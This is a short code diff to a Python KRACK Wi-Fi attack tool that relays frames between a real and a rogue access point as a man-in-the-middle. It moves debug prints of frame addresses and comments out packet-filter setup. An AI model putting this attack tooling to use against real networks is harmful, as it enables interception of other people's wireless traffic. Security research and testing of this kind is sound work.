@@ -95,6 +95,7 @@ class MitmSocket(L2Socket):
 		p = L2Socket.recv(self, x)
 		if p == None: 
 			return None
+		print(p.addr1, p.addr2)
 		if p.getlayer(Dot11) == None:
 			return None
 		# if self.pcap: self.pcap.write(p)
@@ -647,8 +648,6 @@ class KRAckAttack():
 	def handle_rx_realchan(self):
 		p = self.sock_real.recv()
 		if p == None: return
-
-		print(p.addr1, p.addr2)
 		# 1. Handle frames sent TO the real AP
 		if p.addr1 == self.apmac:
 			# If it's an authentication to the real AP, always display it ...
@@ -741,7 +740,6 @@ class KRAckAttack():
 	def handle_rx_roguechan(self):
 		p = self.sock_rogue.recv()
 		if p == None: return
-		print(p.addr1, p.addr2)
 		# 1. Handle frames sent BY the rouge AP
 		if p.addr2 == self.apmac:
 			# Track time of last beacon we received. Verify channel to assure it's not the real AP.
@@ -895,9 +893,9 @@ class KRAckAttack():
 		if self.nic_real_clientack: subprocess.check_output(["ifconfig", self.nic_real_clientack, "up"])
 
 		# FIXME: Set BFP filters to increase performance, can't set suceessful.
-		bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.apmac)
-		if self.clientmac:
-			bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
+		# bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.apmac)
+		# if self.clientmac:
+		# 	bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
 		# bpf = "(wlan type data or wlan type mgt) and (%s)" % bpf
 		# self.sock_real.attach_filter(bpf)
 		# self.sock_rogue.attach_filter(bpf)
